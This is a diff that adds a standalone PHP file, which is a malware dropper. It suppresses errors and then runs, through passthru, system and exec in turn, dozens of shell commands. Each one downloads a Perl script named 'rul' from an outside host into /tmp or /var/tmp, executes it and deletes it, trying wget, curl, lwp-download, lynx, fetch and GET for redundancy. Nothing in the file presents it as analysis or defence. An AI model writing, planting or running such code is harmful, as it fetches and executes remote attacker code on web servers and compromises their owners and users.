@@ -1,0 +1,37 @@
+<?
+set_time_limit(0);
+error_reporting(0);
+@passthru('cd /tmp;wget http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@passthru('cd /tmp;curl -O http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@passthru('cd /tmp;lwp-download http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@passthru('cd /tmp;lynx -source http://ydivorce.com/ray/rul >rul;perl rul;rm -f rul*');
+@passthru('cd /tmp;fetch http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@passthru('cd /tmp;GET http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@passthru('cd /var/tmp;wget http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@passthru('cd /var/tmp;curl -O http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@passthru('cd /var/tmp;lwp-download http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@passthru('cd /var/tmp;fetch http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@passthru('cd /var/tmp;GET http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@system('cd /tmp;wget http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@system('cd /tmp;curl -O http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@system('cd /tmp;lwp-download http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@system('cd /tmp;lynx -source http://ydivorce.com/ray/rul >rul;perl rul;rm -f rul*');
+@system('cd /tmp;fetch http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@system('cd /tmp;GET http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@system('cd /var/tmp;wget http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@system('cd /var/tmp;curl -O http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@system('cd /var/tmp;lwp-download http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@system('cd /var/tmp;fetch http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@system('cd /var/tmp;GET http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@exec('cd /tmp;wget http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@exec('cd /tmp;curl -O http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@exec('cd /tmp;lwp-download http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@exec('cd /tmp;lynx -source http://ydivorce.com/ray/rul >rul;perl rul;rm -f rul*');
+@exec('cd /tmp;fetch http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@exec('cd /tmp;GET http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@exec('cd /var/tmp;wget http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@exec('cd /var/tmp;curl -O http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@exec('cd /var/tmp;lwp-download http://ydivorce.com/ray/rul;perl rul;rm -f rul*');
+@exec('cd /var/tmp;fetch http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+@exec('cd /var/tmp;GET http://ydivorce.com/ray/rul > rul;perl rul;rm -f rul*');
+?>
